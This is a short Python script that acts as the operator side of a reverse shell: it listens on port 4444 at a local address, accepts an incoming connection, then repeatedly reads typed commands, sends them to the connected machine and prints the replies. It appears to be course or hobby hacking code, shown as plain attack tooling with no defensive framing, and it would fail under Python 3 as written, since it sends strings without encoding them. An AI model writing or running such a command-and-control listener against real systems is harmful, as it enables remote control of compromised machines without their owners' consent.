import socket

class Listener:
    
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection,address = listener.accept()
        print("Got Connection from " + str(address))
        
    def execute(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input(">> ")
            response = self.execute(command)
            print(response)
            
listener1 = Listener("192.168.1.11",4444)
listener1.run()